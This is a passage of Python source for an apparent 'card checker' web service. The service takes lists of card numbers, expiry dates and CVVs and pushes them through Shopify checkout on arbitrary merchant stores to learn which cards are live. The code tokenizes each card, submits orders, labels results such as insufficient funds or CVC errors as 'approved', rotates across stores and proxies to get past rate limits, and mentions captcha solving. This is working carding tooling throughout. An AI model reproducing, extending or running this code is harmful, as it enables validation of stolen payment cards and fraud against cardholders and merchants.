            if payment_data.get("__typename") == "FilledPaymentTerms":
                avail_lines = payment_data.get("availablePaymentLines") or []
                for line in avail_lines:
                    pm = line.get("paymentMethod") or {}
                    pid = pm.get("paymentMethodIdentifier")
                    if pid:
                        detected_gateway = (pm.get("extensibilityDisplayName") or
                                            pm.get("name") or pm.get("brand") or
                                            pm.get("displayName") or "Shopify Payments")
                        if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                            payment_identifier = pid
                            gateway = detected_gateway
                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                            try:
                                if float(price) > effective_max_price:
                                    raise _PriceOverMax(
                                        f"PRICE_OVER_MAX: total ${price} > ${effective_max_price:.2f}")
                            except (ValueError, TypeError):
                                pass
                            break

            if not payment_identifier:
                return _r("NO_SHOPIFY_PAYMENTS_GATEWAY",
                          message="Store does not use Shopify Payments",
                          is_site_error=True)

            # ── 4. Delivery proposal ─────────────────────────────────────
            deliv_vars = copy.deepcopy(ship_vars)
            deliv_vars["sessionInput"]["sessionToken"] = sst

            deliv_vars["delivery"]["deliveryLines"][0].update({
                "destination": {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                },
                "selectedDeliveryStrategy": {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {},
                },
                "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                "expectedTotalPrice": {
                    "value": {"amount": str(shipping_amount), "currencyCode": currency}
                },
                "destinationChanged": False,
            })
            deliv_vars["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }
            deliv_vars["taxes"]["proposedTotalAmount"] = {
                "value": {"amount": str(tax_amount), "currencyCode": currency}
            }
            deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                "number": phone, "countryCode": country_code
            }
            if checkpoint_data:
                deliv_vars["checkpointData"] = checkpoint_data

            try:
                dr = await session.post(
                    graphql_url,
                    params={"operationName": "Proposal"},
                    headers=gql_headers,
                    json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                          "operationName": "Proposal"},
                )
                d_resp = orjson.loads(dr.content)
                _del_sst = dr.headers.get("x-checkout-one-session-token")
                if _del_sst:
                    sst = _del_sst
                    gql_headers["x-checkout-one-session-token"] = sst

                d_result = (
                    d_resp.get("data", {}).get("session", {})
                    .get("negotiate", {}).get("result", {})
                )
                if d_result:
                    d_typename = d_result.get("__typename", "")
                    if d_typename == "SubmittedForCompletion":
                        return _r("NO_PAYMENT_REQUIRED",
                                  message="Order auto-submitted before card entry",
                                  is_site_error=True)
                    d_seller = d_result.get("sellerProposal") or {}
                    d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                    d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                    if d_amt:
                        running_total = d_amt
                        try:
                            price = f"{float(running_total):.2f}"
                        except (ValueError, TypeError):
                            pass
                        try:
                            if float(price) > effective_max_price:
                                raise _PriceOverMax(
                                    f"PRICE_OVER_MAX: total ${price} > ${effective_max_price:.2f}")
                        except (ValueError, TypeError):
                            pass
                    d_delivery = d_seller.get("delivery") or {}
                    if d_delivery.get("__typename") == "FilledDeliveryTerms":
                        d_d_lines = d_delivery.get("deliveryLines") or []
                        if d_d_lines:
                            d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                            d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                            if d_strategies:
                                def _d_strategy_cost(s):
                                    try:
                                        a = s.get("amount") or {}
                                        return float(a.get("value", {}).get("amount") or a.get("amount") or "0")
                                    except (ValueError, TypeError):
                                        return float("inf")
                                cheapest_d = min(d_strategies, key=_d_strategy_cost)
                                if d_selected.get("handle"):
                                    delivery_strategy = d_selected["handle"]
                                else:
                                    delivery_strategy = cheapest_d.get("handle", delivery_strategy)
                                d_ship_amt = cheapest_d.get("amount") or {}
                                try:
                                    shipping_amount = float(
                                        d_ship_amt.get("value", {}).get("amount") or
                                        d_ship_amt.get("amount") or "0"
                                    )
                                except (ValueError, TypeError):
                                    pass
                    d_tax = d_seller.get("tax") or {}
                    if d_tax.get("__typename") == "FilledTaxTerms":
                        d_tax_amt = d_tax.get("totalTaxAmount") or {}
                        try:
                            tax_amount = float(
                                d_tax_amt.get("value", {}).get("amount") or
                                d_tax_amt.get("amount") or "0"
                            )
                        except (ValueError, TypeError):
                            pass
            except _PriceOverMax:
                raise
            except Exception as ex:
                log.debug("delivery proposal error: %s", ex)

            # The real order total is only known now: item + shipping + tax.
            # Enforce the ceiling against that, not just the item price.
            try:
                total = float(running_total) + shipping_amount + tax_amount
                if total > effective_max_price:
                    raise _PriceOverMax(
                        f"PRICE_OVER_MAX: total ${total:.2f} > ${effective_max_price:.2f}")
            except (ValueError, TypeError):
                pass

            # ── 5. Tokenize card ─────────────────────────────────────────
            vault_payload = {
                "credit_card": {
                    "number":             cc,
                    "month":              int(month),
                    "year":               int(f"20{year}"),
                    "verification_value": cvv,
                    "name":               f"{first} {last}",
                    "start_month":        None,
                    "start_year":         None,
                    "issue_number":       "",
                },
                "payment_session_scope": hostname,
            }
            vault_headers = {
                "Content-Type":       "application/json",
                "Accept":             "application/json",
                "Accept-Language":    "en-US,en;q=0.9",
                "Origin":             "https://checkout.pci.shopifyinc.com",
                "User-Agent":         ua,
                "sec-ch-ua-mobile":   "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            vault_endpoints = [
                "https://checkout.pci.shopifyinc.com/sessions",
                "https://deposit.shopifyinc.com/sessions",
            ]
            token = None
            for vault_url in vault_endpoints:
                try:
                    vr = await session.post(
                        vault_url, json=vault_payload,
                        headers=vault_headers,
                    )
                    vd = orjson.loads(vr.content)
                    token = vd.get("id")
                    if token:
                        break
                except Exception:
                    continue

            if not token:
                return _r("TOKENIZATION_FAILED",
                          message="Card vault rejected tokenization",
                          is_site_error=True)

            # ── 6. Submit for completion ──────────────────────────────────
            billing_addr = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": first, "lastName": last,
                    "zoneCode": state, "phone": phone,
                }
            }

            def _build_submit_body() -> dict:
                submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                submit_deliv_line["selectedDeliveryStrategy"] = {
                    "deliveryStrategyByHandle": {
                        "handle": delivery_strategy, "customDeliveryRate": False
                    },
                    "options": {"phone": phone},
                }
                submit_deliv_line["expectedTotalPrice"] = {"any": True}

                submit_merch = copy.deepcopy(deliv_vars["merchandise"])
                for ml in submit_merch.get("merchandiseLines", []):
                    ml["expectedTotalPrice"] = {"any": True}

                return {
                    "query": MUTATION_SUBMIT,
                    "variables": {
                        "input": {
                            "sessionInput":       {"sessionToken": sst},
                            "queueToken":         queue_token or "",
                            "discounts":          {"lines": [], "acceptUnexpectedDiscounts": True},
                            "delivery": {
                                "deliveryLines":              [submit_deliv_line],
                                "noDeliveryRequired":         [],
                                "useProgressiveRates":        True,
                                "prefetchShippingRatesStrategy": None,
                                "supportsSplitShipping":      True,
                            },
                            "merchandise":  submit_merch,
                            "payment": {
                                "totalAmount": {"any": True},
                                "paymentLines": [{
                                    "paymentMethod": {
                                        "directPaymentMethod": {
                                            "paymentMethodIdentifier": payment_identifier,
                                            "sessionId":               token,
                                            "billingAddress":          billing_addr,
                                            "cardSource":              None,
                                        }
                                    },
                                    "amount": {"any": True},
                                    "dueAt": None,
                                }],
                                "billingAddress": billing_addr,
                            },
                            "buyerIdentity":      copy.deepcopy(deliv_vars["buyerIdentity"]),
                            "taxes": {
                                "proposedAllocations":         None,
                                "proposedTotalAmount":         {"any": True},
                                "proposedTotalIncludedAmount": None,
                                "proposedMixedStateTotalAmount": None,
                                "proposedExemptions":          [],
                            },
                            "tip":                {"tipLines": []},
                            "note":               {"message": None, "customAttributes": []},
                            "localizationExtension": {"fields": []},
                            "nonNegotiableTerms": None,
                            "optionalDuties":     {"buyerRefusesDuties": False},
                            **({"checkpointData": checkpoint_data} if checkpoint_data else {}),
                        },
                        "attemptToken": attempt_token,
                        "metafields": [],
                        "analytics": {"requestUrl": checkout_url},
                    },
                    "operationName": "SubmitForCompletion",
                }

            s_resp: dict = {}
            for submit_attempt in range(3):
                try:
                    sr = await session.post(
                        graphql_url,
                        params={"operationName": "SubmitForCompletion"},
                        headers=gql_headers,
                        json=_build_submit_body(),
                    )
                    s_resp = orjson.loads(sr.content)
                    _sub_sst = sr.headers.get("x-checkout-one-session-token")
                    if _sub_sst:
                        sst = _sub_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except (asyncio.TimeoutError, RequestsError):
                    return _r("TIMEOUT", message="Submit timed out", is_site_error=True)
                except Exception as ex:
                    log.debug("submit exception: %s", ex)
                    return _r("SUBMIT_FAILED", message=str(ex)[:100], is_site_error=True)

                log.debug("submit[%d] response typename: %s", submit_attempt,
                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))

                s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                if not s_data:
                    errs = s_resp.get("errors") or []
                    log.debug("submit no data, top-level errors: %s", errs)
                    if errs:
                        for err_item in errs:
                            for fld in ("code", "message"):
                                val = str(err_item.get(fld) or "").upper()
                                if val:
                                    norm = _normalize_response(val)
                                    if norm != "CARD_DECLINED":
                                        approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                                        return _r(norm, approved=approved, message=val[:120])
                    return _r("GRAPHQL_ERROR", message="Empty submit response", is_site_error=True)

                stype = s_data.get("__typename", "")

                if stype == "SubmitRejected":
                    sub_errs = s_data.get("errors") or []
                    all_confirmable = all(
                        e.get("__typename") == "ConfirmChangeViolation" for e in sub_errs
                    ) if sub_errs else False
                    if all_confirmable and submit_attempt < 2:
                        log.debug("submit[%d] ConfirmChangeViolation, retrying", submit_attempt)
                        await asyncio.sleep(0.5)
                        continue
                break

            stype = s_data.get("__typename", "")

            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = s_data.get("receipt") or {}
                rtype   = receipt.get("__typename", "")

                if rtype == "ProcessedReceipt":
                    return _r("ORDER_PLACED", charged="True", approved="True",
                              message="Order placed successfully")
                if rtype == "ActionRequiredReceipt":
                    return _r("3DS_REQUIRED", approved="True",
                              message="3D Secure challenge required")
                if rtype == "FailedReceipt":
                    pe      = receipt.get("processingError") or {}
                    pe_type = pe.get("__typename", "")
                    log.debug("FailedReceipt processingError: %s", pe)
                    if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                        return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                    if pe_type == "OrderCreationFailure":
                        return _r("ORDER_CREATION_FAILED",
                                  message="Order creation failure",
                                  is_site_error=True)
                    code = str(pe.get("code") or "").upper()
                    msg  = str(pe.get("messageUntranslated") or "").upper()
                    raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                    norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                    approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                   "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(norm, approved=approved,
                              message=(code or msg or norm)[:120])

                rid = receipt.get("id")
                if rid:
                    poll_body = {
                        "query":         QUERY_POLL,
                        "variables":     {"receiptId": rid, "sessionToken": sst},
                        "operationName": "PollForReceipt",
                    }
                    await asyncio.sleep(2)
                    for _ in range(6):
                        try:
                            pr = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=gql_headers,
                                json=poll_body,
                            )
                            pd = (orjson.loads(pr.content)).get("data", {}).get("receipt") or {}
                            pt = pd.get("__typename", "")
                            if pt == "ProcessedReceipt":
                                return _r("ORDER_PLACED", charged="True", approved="True",
                                          message="Order placed successfully")
                            if pt == "ActionRequiredReceipt":
                                return _r("3DS_REQUIRED", approved="True",
                                          message="3D Secure challenge required")
                            if pt == "FailedReceipt":
                                pe      = pd.get("processingError") or {}
                                pe_type = pe.get("__typename", "")
                                if pe_type in ("InventoryClaimFailure", "InventoryReservationFailure"):
                                    return _r("NO_PRODUCT", message="Inventory failure", is_site_error=True)
                                code = str(pe.get("code") or "").upper()
                                msg  = str(pe.get("messageUntranslated") or "").upper()
                                if code == "CAPTCHA_REQUIRED":
                                    return _r("CAPTCHA_REQUIRED", approved="False",
                                              message="Captcha required", is_site_error=True)
                                raw  = code if code and code not in ("GENERIC_ERROR", "") else msg
                                norm = _normalize_response(raw) if raw else "CARD_DECLINED"
                                approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                               "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                                return _r(norm, approved=approved,
                                          message=(code or msg or norm)[:120])
                            if pt in ("ProcessingReceipt", "WaitingReceipt"):
                                delay = pd.get("pollDelay", 3000) / 1000
                                await asyncio.sleep(min(delay, 4))
                                continue
                        except Exception:
                            pass
                        break

                return _r("CARD_DECLINED", message="Unclassified receipt response")

            if stype == "SubmitFailed":
                reason = str(s_data.get("reason") or "")
                return _r(_normalize_response(reason), message=reason[:120])

            if stype == "SubmitRejected":
                errs = s_data.get("errors") or []
                log.debug("SubmitRejected errors: %s", errs)
                if errs:
                    best_code = "CARD_DECLINED"
                    best_msg  = ""
                    for err_item in errs:
                        for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                    "localizedMessageHtml"):
                            val = str(err_item.get(fld) or "").upper()
                            if not val or val in ("GENERIC_ERROR", "PAYMENT_FAILED",
                                                  "PAYMENT ERROR"):
                                continue
                            norm = _normalize_response(val)
                            if norm != "CARD_DECLINED":
                                best_code = norm
                                best_msg  = val
                                break
                        if best_code != "CARD_DECLINED":
                            break
                    approved = "True" if best_code in ("INSUFFICIENT_FUNDS", "INVALID_CVC",
                                                       "3DS_REQUIRED", "EXPIRED_CARD") else "False"
                    return _r(best_code, approved=approved,
                              message=(best_msg or best_code)[:120])
                return _r("CARD_DECLINED", message="No error detail")

            if stype == "Throttled":
                return _r("THROTTLED", message="Throttled by Shopify", is_site_error=True)
            if stype == "CheckpointDenied":
                return _r("CHECKPOINTDENIED", message="Checkpoint denied", is_site_error=True)

            return _r("CARD_DECLINED", message=f"Unknown submit type: {stype}")

        except _PriceOverMax:
            # The real total is over the cap -- let the caller try the next
            # cheap product instead of reporting a site error.
            raise
        except (asyncio.TimeoutError, RequestsError):
            return _r("TIMEOUT", message="Request timed out", is_site_error=True)
        except Exception as ex:
            log.debug("validate_card exception: %s", ex, exc_info=True)
            err_str = f"{type(ex).__name__}: {str(ex)[:100]}"
            err_lower = err_str.lower()
            if any(k in err_lower for k in ("proxy", "tunnel", "407",
                                             "could not connect to proxy",
                                             "connection to proxy")):
                return _r("PROXY_ERROR", message=err_str, proxy_dead=True, is_site_error=True)
            return _r("SITE_ERROR", message=err_str, is_site_error=True)
        finally:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res):
                    await res


async def validate_card_with_retry(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    max_attempts: int = 6,
) -> dict:
    """Run validate_card, retrying with the next cheap product when the
    real total (product + shipping + tax) exceeds the price cap.

    Shipping and tax are only known after the negotiation, so the cheapest
    item on a store is not always the cheapest order.  This keeps walking
    down the candidate list until one fits the cap.
    """
    last: Optional[dict] = None
    for attempt in range(max_attempts):
        try:
            result = await validate_card(
                cc, month, year, cvv, site_url,
                variant_id=variant_id, proxy_str=proxy_str,
                max_price=max_price, candidate_index=attempt,
            )
        except _PriceOverMax as e:
            # Price over the cap for this candidate -- try the next one.
            last = {
                "Response": f"PRICE_OVER_MAX: {e}",
                "Message": str(e),
                "code": "PRICE_OVER_MAX",
                "decline_code": "PRICE_OVER_MAX",
                "Gateway": "Shopify Payments",
                "Price": "0.00",
                "Proxy": "Live",
                "Status": False,
                "Gate": "Shopify Payments",
                "CC": f"{cc}|{month}|{year}|{cvv}",
                "Product": "",
                "Site": site_url,
                "Charged": "False",
                "Approved": "False",
                "Time": "0.0s",
                "Retry": True,
            }
            if variant_id:
                break
            continue
        resp = str(result.get("Response", ""))
        if "PRICE_OVER_MAX" not in resp:
            return result
        last = result
        # A caller-specified variant cannot be swapped out.
        if variant_id:
            break
    if last is not None:
        return last
    return {
        "Response": "NO_PRODUCT",
        "Message": "No product under the price cap",
        "code": "NO_PRODUCT",
        "decline_code": "NO_PRODUCT",
        "Gateway": "Shopify Payments",
        "Price": "0.00",
        "Proxy": "Live",
        "Status": False,
        "Gate": "Shopify Payments",
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Product": "",
        "Site": site_url,
        "Charged": "False",
        "Approved": "False",
        "Time": "0.0s",
        "Retry": True,
    }


async def validate_card_across_sites(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    sites:      list[str],
    proxy_str:  Optional[str] = None,
    max_price:  Optional[float] = None,
    max_sites:  int = 8,
) -> dict:
    """Try each merchant until one returns a real card verdict.

    A site that is down, requires a login, or has nothing under the price
    cap is skipped -- the next one gets a turn.
    """
    last: Optional[dict] = None
    for site in sites[:max_sites]:
        # The normal route first: it is the fastest one and it is the
        # one that works until a store rate limits us.  Only then is the
        # check repeated through a proxy, which leaves from another
        # address.
        result = await validate_card_with_retry(
            cc, month, year, cvv, site,
            proxy_str=None, max_price=max_price,
        )
        if str(result.get("Response", "")) in ("THROTTLED", "PROXY_ERROR"):
            alt = _pick_rescue_proxy(proxy_str)
            if alt:
                result = await validate_card_with_retry(
                    cc, month, year, cvv, site,
                    proxy_str=alt, max_price=max_price,
                )
        resp = str(result.get("Response", ""))
        # A card verdict (or a bank decline) is a real answer -- stop here.
        if resp not in ("NO_PRODUCT", "CART_FAILED", "SITE_REQUIRES_LOGIN",
                        "NO_SESSION_TOKEN", "NO_ATTEMPT_TOKEN",
                        "NO_SHOPIFY_PAYMENTS_GATEWAY", "CHECKPOINTDENIED",
                        "THROTTLED", "TIMEOUT", "SITE_ERROR", "PROXY_ERROR",
                        "NO_SELLER_PROPOSAL", "GRAPHQL_ERROR",
                        "NO_PAYMENT_REQUIRED", "CART_ERROR", "PRICE_OVER_MAX"):
            _store_pardon(site)
            return result
        # The store could not do the checkout.  It is put aside for a
        # while so the next cards go to the stores that still answer.
        _store_penalise(site)
        last = result
    if last is not None:
        return last
    return {
        "Response": "NO_PRODUCT",
        "Message": "No usable site",
        "code": "NO_PRODUCT",
        "decline_code": "NO_PRODUCT",
        "Gateway": "Shopify Payments",
        "Price": "0.00",
        "Proxy": "Live",
        "Status": False,
        "Gate": "Shopify Payments",
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Product": "",
        "Site": "",
        "Charged": "False",
        "Approved": "False",
        "Time": "0.0s",
        "Retry": True,
    }


# ---------------------------------------------------------------------------
# Valid gateway response codes (site is live)
# ---------------------------------------------------------------------------
LIVE_RESPONSES = frozenset({
    "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
    "CARD_DECLINED", "INVALID_CVC", "EXPIRED_CARD",
    "INVALID_CARD", "THROTTLED",
})


# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.get("/shopify")
async def shopify_route(
    site:      Optional[str] = Query(None, description="Shopify store URL (optional - falls back to site.txt)"),
    cc:        Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
    key:       Optional[str] = Query(None, description="API key"),
):
    """Validate a card against a Shopify store checkout."""

    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        log.warning("Rejected request — invalid key: %r", key)
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401,
        )

    if cc:
        card = _parse_card(cc)
        if not card:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        card = random.choice(cards)

    if site:
        # a comma separated list lets the caller try many stores in ONE
        # request, so a single /shp runs the check once
        sites = [s.strip() for s in site.split(",") if s.strip()]
        if not sites:
            sites = _load_sites_from_file()
    else:
        sites = _load_sites_from_file()
        if not sites:
            return JSONResponse(
                {"error": "No site given and site.txt is empty"},
                status_code=400,
            )
        random.shuffle(sites)
    # The stores that are cooling down are asked last.
    sites = _stores_ready(sites)
    random.shuffle(sites)

    result = await validate_card_across_sites(
        card["cc"], card["month"], card["year"], card["cvv"],
        sites, proxy_str=proxy, max_price=max_price,
    )
    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1

    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:      Optional[str] = Query(None, description="Shopify store URL (optional - falls back to site.txt)"),
    card:      Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
    key:       Optional[str] = Query(None, description="API key"),
):
    if VALID_API_KEYS and (not key or key not in VALID_API_KEYS):
        log.warning("Rejected request — invalid key: %r", key)
        return JSONResponse(
            {"error": "Invalid or missing API key", "Response": "API_AUTH_ERROR"},
            status_code=401,
        )

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        parsed = random.choice(cards)

    if site:
        sites = [s.strip() for s in site.split(",") if s.strip()]
        if not sites:
            sites = _load_sites_from_file()
    else:
        sites = _load_sites_from_file()
        if not sites:
            return JSONResponse(
                {"error": "No site given and site.txt is empty"},
                status_code=400,
            )
        random.shuffle(sites)

    result = await validate_card_across_sites(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        sites, proxy_str=proxy, max_price=max_price,
    )
    site = result.get("Site") or (sites[0] if sites else "")

    response_code = result.get("Response", "")
    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
    return JSONResponse({
        "valid":         response_code in LIVE_RESPONSES,
        "site":          site,
        "product":       result.get("Product", ""),
        "price":         result.get("Price", "0.00"),
        "card_response": response_code,
        "gate":          result.get("Gateway", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.get("/health")
async def health_route():
    cards  = _get_cards()
    return JSONResponse({
        "status":           "ok",
        "cards_loaded":     len(cards),
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "cache_ttl":        CACHE_TTL,
        "max_price":        MAX_PRICE,
        "keys_configured":  len(VALID_API_KEYS),
        "captcha_enabled":  True,
    })


@app.get("/stats")
async def stats_route():
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    count = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": count})


@app.post("/reload")
async def reload_route():
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


@app.get("/")
async def root():
    return JSONResponse({
        "status": "online",
        "endpoints": {
            "/shopify": "GET ?site=site.com&cc=cc|mm|yy|cvv&key=oozaruhshop",
            "/check":   "GET ?site=site.com&card=cc|mm|yy|cvv&key=oozaruhshop",
            "/health":  "GET",
            "/stats":   "GET",
            "/docs":    "Swagger UI",
        },
        "captcha": "enabled",
    })


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    print(f"[API] Shopify Validator running -> http://0.0.0.0:{PORT}")
    print(f"[API] Swagger docs             -> http://0.0.0.0:{PORT}/docs")
    print(f"[API] API key required          -> key=oozaruhshop")
    print(f"[API] Captcha solver            -> the local browser solver")
    uvicorn.run(app, host="0.0.0.0", port=PORT, log_level="info")